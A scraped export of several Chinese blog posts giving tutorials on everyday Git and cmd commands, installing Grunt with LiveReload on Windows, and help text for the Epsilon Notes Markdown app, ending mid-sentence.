每台计算机上只需要配置一次，程序升级时会保留配置信息。 你可以在任何时候再次通过运行命令来修改它们。\nGit 自带一个 git config 的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置： 1. /etc/gitconfig 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果使用带有 –system 选项的 git config 时，它会从此文件读写配置变量。\n ~/.gitconfig 或 ~/.config/git/config 文件：只针对当前用户。 可以传递 –global 选项让 Git 读写此文件。\n 当前使用仓库的 Git 目录中的 config 文件（就是 .git/config）：针对该仓库。\n  每一个级别覆盖上一级别的配置，所以 .git/config 的配置变量会覆盖 /etc/gitconfig 中的配置变量。\n用户信息 当安装完 Git 应该做的第一件事就是设置你的用户名称与邮件地址。 这样做很重要，因为每一个 Git 的提交都会使用这些信息，并且它会写入到你的每一次提交中，不可更改：\n$ git config [--global] user.name \u0026quot;Ricky Fung\u0026quot; $ git config [--global] user.email ricky_feng@163.com  如果使用了 –global 选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有 –global 选项的命令来配置。\n查看配置信息 如果想要检查你的配置，可以使用 git config –list 命令来列出所有 Git 当时能找到的配置。\n$ git config --list core.symlinks=false core.autocrlf=false color.diff=auto color.status=auto color.branch=auto color.interactive=true help.format=html http.sslcainfo=C:/Users/Ricky/AppData/Local/Programs/Git/mingw64/ssl/certs/ca-bundle.crt diff.astextplain.textconv=astextplain rebase.autosquash=true user.name=Ricky Fung user.email=ricky_feng@163.com  查看当前文件状态 要查看哪些文件处于什么状态，可以用 git status 命令。 如果在克隆仓库后立即使用此命令，会看到类似这样的输出：\n$ git status On branch master nothing to commit, working directory clean  添加文件 $ git add [file1] [file2] ... $ git add [dir] $ git add . $ git add -A  删除文件 $ git rm [file1] [file2] ...  代码提交 $ git commit -m [message] 如: git commit -m \u0026quot;modify\u0026quot; $ git commit [file1] [file2] ... -m [message] $ git commit -a $ git commit -v $ git commit --amend -m [message] $ git commit --amend [file1] [file2] ...  标签 $ git tag # 查看当前分支下的所有标签 $ git tag [tag name] $ git tag -a [tag name] -m [message] $ git tag -a [tag name] [version] $ git tag -d [tag] # 删除标签 $ git push origin :refs/tags/[tagname] $ git push origin --delete tag $ git show [tag] # 查看标签信息 $ git push [remote] [tag] $ git push [remote] --tags $ git checkout -b [branch] [tag] # 切换到标签  分支管理 $ git branch $ git branch -r $ git branch -a $ git branch [branch-name] $ git checkout -b [branch] $ git checkout [branch-name] $ git merge [branch] $ git branch -d [branch-name] $ git push origin --delete [branch-name] $ git push origin :[branch-name]  变基 $ git checkout dev $ git rebase master First, rewinding head to replay your work on top of it... Applying: added staged command  查看log $ git log  diff $ git diff [file]  show $ git show [version] $ git show --name-only [version] $ git show [version]:[filename]  远程同步 $ git fetch [remote] $ git remote -v $ git remote show [remote] $ git remote add [shortname] [url] $ git pull [remote] [branch] $ git push [remote] [branch]  参考资料 《Pro Git 2nd Edition》\n","permalink":"http://localhost:8000/public/post/git-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","tags":["git"],"title":"Git 常用命令"},{"categories":["学习笔记"],"contents":" 常用 cmd 命令 1. 进入 cmd 命令窗口：快捷键 Win+R,输入 “cmd” ，点击“运行”即可。 2. cd.. # 返回上一级文件夹 3. cd [文件夹名] # 进入下一级文件夹 4. d: # 进入另一个磁盘（如：D盘）根目录 5. cd [文件夹路径] # 进入任一文件夹 6. dir # 查看当前路径文件夹内容 7. mkdir [文件夹名] # 创建文件夹 8. start D:\\Github\\Hugo\\bin\\hugo.exe # 如何在cmd中打开D:\\Github\\Hugo\\bin\\hugo.exe 9. cls 或者 clear # cmd清屏  在 sublime 编辑器中运行 cmd 这里需要用到SublimeREPL插件.\n 给sublime text2/3安装SublimeREPL插件； 重启sublime text2/3； 按组合键 Ctrl+Shift+P， 然后输入sublimerepl:shell，选中它单击即可调出cmd命令。  ","permalink":"http://localhost:8000/public/post/%E5%B8%B8%E7%94%A8-cmd-%E5%91%BD%E4%BB%A4%E9%81%87%E5%88%B0%E7%9A%84/","tags":["cmd","sublime text"],"title":"常用 cmd 命令（遇到的）"},{"categories":["学习笔记"],"contents":" 查看分支 查看本地分支 使用 git branch命令，如下：\n$ git branch * master  *标识的是你当前所在的分支。\n查看远程分支 命令如下：\ngit branch -r  查看所有分支 命令如下：\ngit branch -a  本地创建新的分支 命令如下：\ngit branch [branch name]  例如：\ngit branch gh-dev  切换到新的分支 命令如下：\ngit checkout [branch name]  例如：\nRicky@DESKTOP-1QPASTR MINGW64 /f/Git_Studio/design-patterns (master) $ git checkout gh-dev Switched to branch 'gh-dev' Ricky@DESKTOP-1QPASTR MINGW64 /f/Git_Studio/design-patterns (gh-dev)  创建+切换分支 创建分支的同时切换到该分支上，命令如下：\ngit checkout -b [branch name]  git checkout -b [branch name] 的效果相当于以下两步操作：\ngit branch [branch name] git checkout [branch name]  将新分支推送到github 命令如下：\ngit push origin [branch name]  例如：\ngit push origin gh-dev  删除本地分支 命令如下：\ngit branch -d [branch name]  例如：\ngit branch -d gh-dev  删除github远程分支 命令如下：\ngit push origin :[branch name]  分支名前的冒号代表删除。\n例如：\ngit push origin :gh-dev   注意：通过 Pull request 创建的新分支默认会有一个 Pull request 的 Open 状态标识，这种状态下的分支是无法删除的（页面操作与命令行操作都无法删除），需要到 Pull request 选项里面将 Open 改为 close 后才可删除。\n 下载github某个单独分支 git clone -b gh-pages https://github.com/kuleyu/hexolog.git   其实没有这个说法，这个命令同样也会把所有分支下载下来，只不过下载后的当前分支是这个指定的分支而已。\n ","permalink":"http://localhost:8000/public/post/github-%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/","tags":["git"],"title":"Github 分支操作"},{"categories":["搬运整理"],"contents":"转载 - 蓝色梦想\nGrunt基于Node.js，其中 npm 是 Node.js 的包管理器，而Grunt和Grunt插件就通过 npm 安装并管理。\nGrunt 0.4.x 必须配合Node.js \u0026gt;= 0.8.0版本使用。\n安装Node.js：\n去Node.js官网，点击INSTALL下载并安装，现在的Node.js会自动安装npm。\n安装完成之后，打开命令行，进行后续的操作（开始-\u0026gt;输入CMD 或 开始-\u0026gt;所有程序 -\u0026gt;命令提示符）。\n进入Node.js的安装目录（默认路径为\u0026rdquo;C:Program Filesnodejs\u0026rdquo;）：\ncd pronod\n可以通过以下2个命令，查看 node.js 和 npm 的版本号：\nnode -v npm -v\n安装Grunt：\n如果你之前安装过老的0.3版本，请先卸载：\nnpm uninstall -g grunt\n安装Grunt命令行（CLI）：\nnpm install -g grunt-cli\n注1：-g代表全局安装，Grunt有二个版本：服务器端版本（grunt）和客户端版本（grunt-cli）。\n注2：安装grunt-cli并不等于安装了grunt！grunt CLI的任务很简单：调用与Gruntfile在同一目录中的grunt。这样带来的好处是，允许你在同一个系统上同时安装多个版本的grunt。而grunt使用模块结构，除了安装命令行界面以外，还要根据需要安装相应的模块。这些模块应该采用局部安装，因为不同项目可能需要同一个模块的不同版本。\n上述命令执行完后，grunt 命令就被加入到你的系统路径中了，以后就可以在任何目录下执行此命令了。\n创建新的Grunt项目：\n假设这个项目安装在D盘根目录，我们首先进度D盘：\nd:\n创建项目文件夹：\nmkdir testProject\n进入文件夹：\ncd testProject\n接着在你的项目文件夹根目录下添加两个文件：package.json 和 Gruntfile。\npackage.json: 此文件被npm用于存储项目的元数据，以便将此项目发布为npm模块。\nGruntfile: 此文件被命名为 Gruntfile.js 或 Gruntfile.coffee，用来配置或定义任务（task）并加载Grunt插件。\n创建package.json文件：\npackage.json应当放置于项目的根目录中，与Gruntfile在同一目录中，并且应该与项目的源代码一起被提交。大部分 grunt-init 模版都会自动创建特定于项目的package.json文件。\n方法一：执行 npm init (选方法一。方法二手动添加后在安装时出现错误)命令（根据默认的grunt-init模板，引导你创建一个\u0026rdquo;基本\u0026rdquo;的package.json文件）：\nnpm init\n根据提示填写信息（都允为空）：\nname: (GruntT)　// 模块名称：只能包含小写字母数字和中划线，如果为空则使用项目文件夹名称代替 version: (0.0.0)　// 版本号 description:　// 描述：会在npm搜索列表中显示 entry point: (index.js)　// 模块入口文件 test command:　// 测试脚本 git repository:　// git仓库地址 keywords:　// 关键字：用于npm搜索，多个关键字用空格分开 author:　// 作者 license: (BSD-2-Clause) // 开原协议  方法二：手动创建package.json文件，添加项目/模块的描述信息：\n{ \u0026quot;name\u0026quot;: \u0026quot;my-project\u0026quot;, \u0026quot;version\u0026quot;: \u0026quot;0.1.0\u0026quot; }  附：\npackage.json官方文档\n一个较完整的package.json文件\n安装Grunt和Grunt插件：\n方法一：手动添加，修改package.json文件：\n{ \u0026quot;name\u0026quot;: \u0026quot;my-project\u0026quot;, \u0026quot;version\u0026quot;: \u0026quot;0.1.0\u0026quot;, \u0026quot;devDependencies\u0026quot;: { \u0026quot;grunt\u0026quot;: \u0026quot;~0.4.1\u0026quot;, \u0026quot;grunt-contrib-cssmin\u0026quot;: \u0026quot;~0.7.0\u0026quot; } }  注：devDependencies里面的参数，指定了项目依赖的Grunt和Grunt插件版本。其中\u0026rdquo;~0.7.0\u0026rdquo;代表安装该插件的某个特定版本，如果只需安装最新版本，可以改成\u0026rdquo;*\u0026ldquo;。\n然后执行：\nnpm install\n这时你会发现项目文件夹中多了个node_modules文件夹，其里面就是对应的Grunt和Grunt插件。\n方法二：自动安装：\n通过 npm install --save-dev 命令\n安装最新版的Grunt：\nnpm install grunt \u0026ndash;save-dev\n接着安装我们所需要的插件：\nnpm install grunt-contrib-cssmin \u0026ndash;save-dev\n注：其中\u0026ndash;save-dev，表示将它作为你的项目依赖添加到package.json文件中devDependencies内。如果你要安装指定版本的Grunt或者Grunt插件，只需要运行npm install grunt@VERSION \u0026ndash;save-dev命令，其中VERSION就是你所需要的版本(指定版本号即可)。\n附：Grunt官方插件列表，其中带星号的为官方维护的插件。\n创建Gruntfile.js文件：\nmodule.exports = function(grunt) { // 配置任务参数 grunt.initConfig({ pkg: grunt.file.readJSON('package.json'), cssmin: { combine: { files: { 'css/release/compress.css': ['css/*.css'] // 指定合并的CSS文件 ['css/base.css', 'css/global.css'] } }, minify: { options: { keepSpecialComments: 0, /* 删除所有注释 */ banner: '/* minified css file */' }, files: { 'css/release/master.min.css': ['css/master.css'] } } } }); // 插件加载（加载 \u0026quot;cssmin\u0026quot; 模块） grunt.loadNpmTasks('grunt-contrib-cssmin'); // 自定义任务：通过定义 default 任务，可以让Grunt默认执行一个或多个任务。 grunt.registerTask('default', ['cssmin']); };  执行配置中所有的任务：\ngrunt\n执行某个特定的任务：\ngrunt cssmin\n测试：\n接着我们在项目文件夹中创建个子文件夹，命名为：CSS\n并且在里面创建base.css和master.css，2个CSS文件，你可以随便写点内容在里面。\n然后在命令行中执行grunt，看到如下提示说明执行成功：\nRunning \u0026ldquo;cssmin:combine\u0026rdquo; (cssmin) task\nFile css/release/compress.css created.\nRunning \u0026ldquo;cssmin:minify\u0026rdquo; (cssmin) task\nFile css/release/master.min.css created.\nDone, without errors.\n参考文档：\nNIGHT MODE\n","permalink":"http://localhost:8000/public/post/windows-%E4%B8%8B%E5%AE%89%E8%A3%85-grunt-%E7%9A%84%E6%8C%87%E5%8D%97%E5%92%8C%E7%9B%B8%E5%85%B3%E8%AF%B4%E6%98%8E/","tags":["Grunt"],"title":"Windows 下安装 Grunt 的指南和相关说明"},{"categories":["搬运整理"],"contents":"转载 - 蓝色梦想\n注意文末的更新\n苦B的前端每次在制作和修改页面时，都有一个特定的三部曲：coding-save-F5。很多时候都希望自己一改东西，页面就能立刻显示，而现在LiveReload就能做到这点。\nLiveReload会监控你指定的目录中文件，如果有文件被更改，它就自动触发浏览器刷新页面。但如果你修改的是CSS或者图片，页面内容会即时更新，无需重新加载。这样我们不用每次修改文件后，都要去按下F5刷新页面，而是直接就能显示，有点类似所见即所得的编辑模式，特别适合使用双屏coding的人。另外同时结合Sublime text和Emmet LiveStyle，能提高不少开发效率。\nLiveReload安装前的准备工作：\n安装Node.js和Grunt，如果第一次接触，可以参考：Windows下安装Grunt的指南和相关说明，根据步骤操作，创建完package.json 和 Gruntfile.js这2个文件就行。\n接下来，开始配置LiveReload所需要的环境和相关插件。这里所提供的有两种安装方案，根据自己需求进行选择。\n方案一：grunt-livereload + Chrome Plug-in\n优点：安装、配置简单方便。\n缺点：需要配合指定的浏览器插件（Firefox也有相关插件，IE么你懂的）。\n1. 需要安装2个插接件：grunt-contrib-watch、connect-livereload\n执行命令：npm install \u0026ndash;save-dev grunt-contrib-watch connect-livereload\n2. 安装浏览器插件：Chrome LiveReload\n3. 配置一个Web服务器（IIS/Apache），LiveReload需要在本地服务器环境下运行（对file:///文件路径支持并不是很好）。\n4. 修改Gruntfile.js文件：\nmodule.exports = function(grunt) { // 项目配置(任务配置) grunt.initConfig({ pkg: grunt.file.readJSON('package.json'), watch: { client: { files: ['*.html', 'css/*', 'js/*', 'images/**/*'], options: { livereload: true } } } }); // 加载插件 grunt.loadNpmTasks('grunt-contrib-watch'); // 自定义任务 grunt.registerTask('live', ['watch']); };  5. 执行：grunt live\n看到如下提示，说明已经开始监听任务：\n Running \u0026quot;watch\u0026quot; task Waiting...  6. 打开我们的页面，例如：http://localhost/\n7. 再点击Chrome LiveReload插件的ICON，此时ICON圆圈中心的小圆点变成实心的，说明插件执行成功。此时你改下网站文件看看，是不是实时更新了？\n方案二：grunt-contrib-watch + grunt-contrib-connect + grunt-livereload\n优点：自动搭建静态文件服务器，不需在自己电脑上搭建Web服务器。\n不需要浏览器插件的支持（不现定于某个浏览器）。\n不需要给网页手动添加livereload.js。\n缺点：对于刚接触的人，配置略显复杂。\n1. 安装我们所需要的3个插件：grunt-contrib-watch、grunt-contrib-connect、connect-livereload\n执行命令：npm install \u0026ndash;save-dev grunt-contrib-watch grunt-contrib-connect connect-livereload\n2. 修改Gruntfile.js文件：\nmodule.exports = function(grunt) { // LiveReload的默认端口号，你也可以改成你想要的端口号 var lrPort = 35729; // 使用connect-livereload模块，生成一个与LiveReload脚本 // http://www.google-analytics.com/ga.js\u0026quot;\u0026gt; src=\u0026quot;http://127.0.0.1:35729/livereload.js?snipver=1\u0026quot; type=\u0026quot;text/javascript\u0026quot;\u0026gt; var lrSnippet = require('connect-livereload')({ port: lrPort }); // 使用 middleware(中间件)，就必须关闭 LiveReload 的浏览器插件 var lrMiddleware = function(connect, options) { return [ // 把脚本，注入到静态文件中 lrSnippet, // 静态文件服务器的路径 connect.static(options.base[0]), // 启用目录浏览(相当于IIS中的目录浏览) connect.directory(options.base[0]) ]; }; // 项目配置(任务配置) grunt.initConfig({ // 读取我们的项目配置并存储到pkg属性中 pkg: grunt.file.readJSON('package.json'), // 通过connect任务，创建一个静态服务器 connect: { options: { // 服务器端口号 port: 8000, // 服务器地址(可以使用主机名localhost，也能使用IP) hostname: 'localhost', // 物理路径(默认为. 即根目录) 注：使用'.'或'..'为路径的时，可能会返回403 Forbidden. 此时将该值改为相对路径 如：/grunt/reloard。 base: '.' }, livereload: { options: { // 通过LiveReload脚本，让页面重新加载。 middleware: lrMiddleware } } }, // 通过watch任务，来监听文件是否有更改 watch: { client: { // 我们不需要配置额外的任务，watch任务已经内建LiveReload浏览器刷新的代码片段。 options: { livereload: lrPort }, // '**' 表示包含所有的子目录 // '*' 表示包含所有的文件 files: ['*.html', 'css/*', 'js/*', 'images/**/*'] } } }); // grunt.initConfig配置完毕 // 加载插件 grunt.loadNpmTasks('grunt-contrib-connect'); grunt.loadNpmTasks('grunt-contrib-watch'); // 自定义任务 grunt.registerTask('live', ['connect', 'watch']); };  5. 执行：grunt live\n看到如下提示，说明Web服务器搭建完成，并且开始监听任务：\n Running \u0026quot;connect:livereload\u0026quot; (connect) task Started connect web server on 127.0.0.1:8000. Running \u0026quot;watch\u0026quot; task Waiting...  注：执行该命令前，如果你有安装过LiveReload的浏览器插件，必须关闭。\n6. 打开我们的页面，例如：http://localhost:8000/ 或 http://127.0.0.1:8000/\n注：这里所打开的本地服务器地址，是我们刚才通过connect所搭建的静态文件服务器地址，而不是之前你用IIS或Apache自己搭建Web服务器地址。\n7. 开始体验吧。\n相关插件文档（GitHub）：\ngrunt-contrib-watch\ngrunt-contrib-connect\nconnect-livereload\n参考资料：\nGrunt by Example - A Tutorial for JavaScript\u0026rsquo;s Task Runner\n更新于：2015-08-17\n总有小伙伴，通过各种方式给我留言，说自己配置出来运行报错。但通常都无法正确表述问题在哪，这让我很难帮到你什么。另外，我也无法保证所有问题都能即时回复，所以大家可以先通过以下3个步骤，进行自查。\n1. 核对下各个插件是否都顺利安装。\n2. 检查一边是否有遗漏的步骤和地方。\n3. 我把本文的配置信息都上传至了Github，有需要的朋友可以下载下来进行对比：Github：2015-08-17\n更新于：2015-10-12\ngrunt-contrib-connect 0.11.x 版本开始，静态文件服务器的创建，需要安装 serve-static 插件支持，否则会出现错误提示\u0026rdquo;connect.static is not a function Use.\u0026rdquo; 另外，启用目录浏览，也需要独立安装 serve-index 插件才能支持。\n所以这次补充2个新的插件：serve-static(用于创建静态文件服务器)、serve-index(用于启用目录浏览)\n执行命令：npm install \u0026ndash;save-dev serve-static serve-index\nGruntfile.js文件更新及调整部分：\n// 使用 middleware(中间件)，就必须关闭 LiveReload 的浏览器插件 var serveStatic = require('serve-static'); var serveIndex = require('serve-index'); var lrMiddleware = function(connect, options, middlwares) { return [ lrSnippet, // 静态文件服务器的路径 原先写法：connect.static(options.base[0]) serveStatic(options.base[0]), // 启用目录浏览(相当于IIS中的目录浏览) 原先写法：connect.directory(options.base[0]) serveIndex(options.base[0]) ]; };  完整版请查看：Github：2015-10-12\n","permalink":"http://localhost:8000/public/post/grunt-%E6%8F%92%E4%BB%B6%E4%B9%8B-livereload-%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E8%87%AA%E5%8A%A8%E5%88%B7%E6%96%B0/","tags":["grunt"],"title":"Grunt 插件之 LiveReload 实现页面自动刷新"},{"categories":["搬运整理"],"contents":"  img{width:50%;} \nTo return to top, tap on any heading\nIntroduction Epsilon Notes is a program for writing formatted texts, so your texts look nice and professional. It uses a marking method called \u0026ldquo;Commonmark\u0026rdquo;, which takes only a few minutes to learn. You can read about Commonmark after the description of the functions of Epsilon Notes.\n==Download Epsilon Notes== from ++Google Play++ only to have the latest version.\nThe current help is not complete due to recent updates. Read more in Menu → Help → What\u0026rsquo;s new.\nDescription（说明） File Manager（文件管理器） Formats: Epsilon Notes can read and save text files (.txt, .md, .cm, .markdown, .mkd).\nAccess: To open the file manager, swipe from the right side of the screen to its center.\nUnaccessible folders: Some folders are not accessible in Android 6+. If Epsilon Notes cannot read a folder, it will propose opening one of the default folders.\nWidth: To change the file manager width, select it in the Preferences.\nContext menu: Long-press a filename to access more functions, such as \u0026ldquo;rename\u0026rdquo;, \u0026ldquo;delete\u0026rdquo; etc.\nSorting: Files can be sorted by name or time. The time of file changes is shown under the file name. You can hide this field via the Preferences.\nButtons: The file manager has a few buttons at the top: * Context menu * Default folders * Lock * Index * Sort * Search\nContext Menu button long click changes the width of the file manager.\nNew file: When you open the file manager, you will see the round button with a plus (+). Use it to create a new file.\nFile manager as Home screen: You can use this program to create your personal Wikipedia with wiki-links between files. So, when you open the Epsilon Notes, it starts with the last page that you opened last time. From that page you can navigate to other pages by clicking on the links that the page has. But if you want to see the File Manager first, go to the Preferences and turn on the option File manager as Home screen.\nCopy and paste: Currently, Copy and Paste works only in Internal Memory.\nTo copy files, make a long click on the filename. You will see a menu and \u0026ldquo;Copy\u0026rdquo; option.\nTo paste that file, go to the top menu of the File Manager and choose \u0026ldquo;Paste\u0026rdquo; there.\nNote: folders can be copied only if they are not empty.\nHere is the scheme:\n\nSee the picture in Internet Preview of non-commonmark files: in the Preferences, there is a \u0026ldquo;File Launch Filter\u0026rdquo;. Use this option to launch files when you press links, such as [My puppies](my_puppy.avi) (a movie link). These files appear in the File Manager on a blue background. If you make a long click on these files in the File Manager, you can launch them for a preview.\nBack button returns to the previous document of the current session.\nTo exit the app instead of navigating back - make a long tap on the BACK button.\n\nIndex file（索引文件） Home page for your folders: If you are working on a project in a folder, create an index file there with the default extension (index.md - for example). The file will open automatically when you enter the folder. You can use this index file as a home page. You can turn off this function the Preferences or in the File Manager (index button).\nNote: the index file must have one of the default extensions (.txt, .cm, .md, .markdown or .mkd). Epsilon Notes will open the one that it finds first among:\n index.md index.txt index.cm index.mkd index.markdown  Reminder about links: When you write a link to another Commonmark file, you do not need to specify its extension (.md, .txt etc.). It will open the first file it finds, or will try to create a file with the default extension selected in the Preferences.\nToggle opening index file: Use an index file in a folder with a home page containing links to other documents in the folder. However, this function may interfere with other functions, such as moving the currently open file. In this case, you can turn off opening the index file by pressing the \u0026ldquo;Home\u0026rdquo; button at the top of the file manager.\nIndex Panel (The left sliding panel for index / contents / favorites links )(索引面板) Index panel description（索引面板说明） Epsilon Notes has a left sliding panel（滑动面板）. Use it to create your own menu with links to your favorite files.\nTo do that, go to Preferences and copy the contents of a file with your links. To fill the index panel, use Commonmark just like in any other Commonmark file.\nHere is an example of how people use the Index Panel.\nThe text copied to the Preferences:\n\nTap on the picture to see it in the browser\n\n\nThe same text rendered as side menu in the index panel:\n\nTap on the picture to see it in the browser\n\n\nGlobal index panel path:\nInstead of providing markdown text in the Preferences → Global Index, you can provide path, in the format:\nfile:///storage/1234-ABCD/.../file.md  Global index vs. local index: You can toggle the left panel contents. One is Global Index and the other is Local Index.\nYou fill the Global Index through Preferences.\nThe Local Index is filled from the Index file in the current folder.\nUsage:\nSuppose, you work on a large document of 200 pages. It may be difficult to navigate through it by always returning to the Table of Contents.\nConsider placing that document to a folder and breaking it into a number of small documents, and add an index file (index.md) with links to all those documents. This index file will open when you enter the folder and will appear in the left panel under the Home button.\nIn other words, you can have general and context based indexes.\nNote: the local index is read only when the local index panel is active. No worries about redundant operations. If you don\u0026rsquo;t open it, the index file is not read into it.\nIndex Panel Photo（索引面板图片设置） The index sliding panel has an image.\n If you are in the habit of keeping a photo of your beloved ones or your favorite city in your wallet, you can replace this photo in the Index panel with your photo.  To change the picture in the Index Panel, long press the current picture. Use small compressed pictures.\nOr, provide the picture path in the Preferences → Global and local index panel → Index panel image path, as follows:\nfile:///storage/emulated/0/.../myimage.jpg  Note: On older devices, if you do not see the picture, try compressing it.\n\nFor efficiency, it is recommended to use smaller compressed pictures.\n\n If you don\u0026rsquo;t want photos, you can disable the field by checking the setting in the same Preferences section.  Storage on external SD for unrooted devices in any folder(可存储到没有root的设备外部SD卡的任何文件夹中)* * Available in Premium Version\nYou can store files on your external SD card. To do that, go to the Preferences, select Get SD Access and point to your extetnal SD.\n\nTap on the picture to see it in the browser\n\n\nNote: The picture may differ depending on your device.\nThere are a few remarks on external storage in the Q\u0026amp;A section of What\u0026rsquo;s New. Please, read the remarks too if you need to write to an external memory card.\nHome page（主页） When you launch the app, it opens the last file. You can set the home page file in the Preferences, which will open when the program is started. The path provided in this option must be full, for example:\nfile:///storage/emulated/0/MyNotes/homepage.md  If the app does not find the homepage at the specified path or if this option is empty, it will open the last document instead.\nSo, now, you can make a homepage with links to other documents, which will be launched when you start Epsilon Notes.\nDirectory lock（目录锁） Directory lock: In the file manager\u0026rsquo;s top menu, there is an option lock / release folder, which fixes the current folder as a working folder. You cannot leave the folder, until you release it. When the directory is locked, the exit path disappears.\nFile launch filter（文件启动过滤器）  When you make a link to a file, which is not supported by Epsilon Notes, the app adds the default extension. If you have .md as the default extension and you click on [Video](file:///storage/extSdCard/Video/MyLovelyPuppy.mov), instead of running the video MyLovelyPuppy.mov, Epsilon Notes will try to open a file MyLovelyPuppy.mov.md.  To avoid that behavior, add the \u0026ldquo;mov\u0026rdquo; extension to the File Launch option in the Preferences. The format is (for example):\n.avi,.mp4,.xls,.doc,.pdf,.mov etc.  If links with these extensions are clicked, Epsilon Notes will try launching an outside program to run those files.\nFiles with extensions specified in the File Launch Filter appear in the file manager, too. When you click on the name of such file, path to it is copied to Clipboard and is ready for pasting in your Commonmark document.\nThings to bear in mind:\n Android file system is case-sensitive. So, /storage/extSdCard/ is not the same as /sToraGe/ExtSDCaRD/. Add extensions to the list in the Preferences preceded by ++a dot++ and separated by ++commas++ without any additional symbols, like spaces. You cannot use spaces in links. Write [My kitty](my%20kitty.avi). Do not write My kitty.  Text files filter（文本文件过滤器） In the Preferences, you can specify (in the Text Files Filter 文本文件过滤器) what files should be treated as simple text files and edit them with Epsilon Notes.\nSuppose, you need to edit your .css files in Epsilon Notes. You can add this extension to the filter, if it is not yet there, and edit .css files in Epsilon Notes\nPreferences Backup（重置个性化设置） ☆ You can backup your preferences before reinstalling Epsilon Notes and then restore them. If you use an external SD card, you need to point to you SD card again, as permissions cannot be backed up.\nView Modes（视图模式）  The processor has three main modes: reading, html-viewing and editing.\n When you create a new file, if it already exists, Epsilon will not allow you to overwrite it. Create a file with a different name, or delete the old file.\n The symbols frequently used in Markdown are available on the symbol bar above the on-screen keyboard.\n The edited line is centered (this fuction can be disabled via Preferences). This option allows you to see always part of the edited text before and after the edited line, so you can better concentrate on the idea of the edited paragraph.\n Width of the edit and view screens may be narrowed for wide screens, improving the comfort of working on wide tab screens (via preferences). If you use a tablet, try setting the screen, say to 90%.\n For compatibility with Commonmark referencing to files, spaces in newly created and renamed files are replaced with underscore. ==Avoid using spaces in file names==, otherwise browsers will need to render them to %20 format, which is inconvenient and may cause stumbling from time to time.\n  Recent files（最近浏览文件） Access: You can get the list of recent files by selecting \u0026ldquo;Recent Files\u0026rdquo; option (Replay button) in the menu. Press back to exit the Recent Files screen.\nClear list: You can clear the recent files list via the Preferences\nExit: Press back to return to your document.\nTimely clearing list of recent files: The program saves at most 100 items of the list when you exit the program.\nHTML Export（导出为 HTML 文件） You can export generated HTML code to the current file directory. Go to Menu-\u0026gt;Export HTML\nReader mode（阅读模式）  You can activate the reader mode through the Reader mode button in the left index panel. In this mode, only the view screen and the file browser are accessible.\n To activate the edit round button (+), while in the reader mode, double tap in an empty place on the screen.\n  Edit Mode（编辑模式） Statistics（统计） You can see the text statistcs (symbol and word counts) at the top of the edit screen. In the Preferences, you can set the appearance of the Text Statistics bar (none, small, normal)\nEdit mode fonts（字体设置） ☆ You can set various fonts for Edit mode in the Preferences:\n   Font name Description     Monospace Default font.   System Your device\u0026rsquo;s normal font.   Dotted space Monospace font, which allows you to control the invisible spaces at the end of line.   From file Download your font, for example, from here, unzip it and provide the full path to the font in the setting Font file path.    Save button（保存按钮） There is a round save button in the Edit mode. You can turn it off in the Preferences, if it bothers you writing. Its functions are duplicated by the Back button.\nExit without saving（不保存退出） Symbol Bar No. 2 has a button for canceling the editing.\nEdit mode wrapping（自动换行） Edit mode word wrapping: if you have a lot of tables, then the automatic word wrapping in the Edit mode becomes inconvenient. You can disable it in the Preferences.\nSearch bar（搜索栏＊[编辑模式里的搜索栏只能搜索定位显示一个目标内容，比非编辑模式的搜索功能要差]＊）  If you work with a long text and you need to navigate quickly to some specific point, you can use the search bar at the top of the edit screen. Search is case-insensitive.\n You can delete the search bar contents by tapping on the \u0026times; sign on the right.\n The main goal of the search bar is to make editing long documents as easy as possible, so use the Search Line whenever you need to make a quick jump to some part of the text in the edit mode.\n  Light Edit mode（简易编辑模式） (This mode is set via Preferences)\nYou can use this mode, if you want a faster and simpler editing experience without glitters and frills.\nIf enabled, this mode will: - disable the statistics display（关闭统计显示功能） - disable text centering（关闭文字居中功能） - disable undo/redo（关闭撤销／重做功能） - disable live-preview（关闭实时预览功能） - disable all keyboard hotkeys (Ctrl+A etc.)（关闭所有快捷键功能）\nNote on very large texts:\nOn a mobile device, it is advised to break heavy documents into smaller ones (10-15 pages, max.), and to use the Local Index Panel for navigation between the chapters kept in a folder. Reader behavior research advises that articles should be 2000-3000 words.\nSmaller texts are easier to manage and read. Besides, they consume less memory, require less operations, open fast and save battery.\nHowever, if you still prefer handling gigantic texts, to speed up the keyboard response, you are advised to enable the Light Edit mode.\nWarning: If the text size is abused, the keyboard may stop responding and out of memory problem may occur.\nSymbol bars（符号条设置） If you have forgotten what a symbol button means, you can make a long tap on the symbol button icon to see a popup hint.\n You can customize up to 6 symbol bars:  For example, one for Commonmarks, another one for math symbols (use Unicode). Separate symbols with a comma.\n The symbol bar setting has a few reserved words.1\n Two symbol bars can be restored to their default values. The other 4 bars are at your full disposal（任你分配）.\n To switch between symbol bars, use the rightmost button with its number.\n You can change the width of the symbol bar buttons. The width ranges between 0 and 30. If the width value is out of this range is entered, then the middle value \u0026ldquo;15\u0026rdquo; will be used.\n To change the width, make a long tap on the button with the number of the symbol bar.  You can create empty space between buttons with the help of a comma. For example:\nA,B,C,,D,E  will produce an empty space between buttons C and D.\n You can edit the Symbol bar from the Preferences and from the Edit mode. To edit the Symbol bar symbols, long press the rightmost button with the number of the current symbol bar.\n You can also customize the icons (symbols), which appear on the symbol bar. Suppose, you are writing a scientific article on the French history, and your key word is\n  \"anticonstitutionnellement\"\nand, suppose, you need to write this long word 2500 times throughout your article. You could add this word to the symbol bar via the Preferences, but then it would take too much space in the symbol bar. So, you can use one or two symbols to hide the whole word on the symbol bar. The format is\nSS:TEXT  Where SS stands for the symbol (1 to 4 max) to appear on the bar, and TEXT is the text that will be sent, once you press on that symbol. Thus, you can write in the settings of the symbol bar among other shorcuts:\nP1:anticonstitutionnellement  In the Symbol Bar you will see P1 appear, but as soon as you press on it, it will produce\nanticonstitutionnellement\nto your text.\nTo cut it short: if you enter the following line in one of the symbol bar settings:\nHello,bye,$,LW:long word  You will see on the symbol bar\nHello bye $ LW  When you press on these symbols in the Editor mode, the editor will type:\nHello by $ long word  i.e. the \u0026ldquo;long word\u0026rdquo; will be hidden behind LW.\nComma and Enter in Symbol bar\nComma 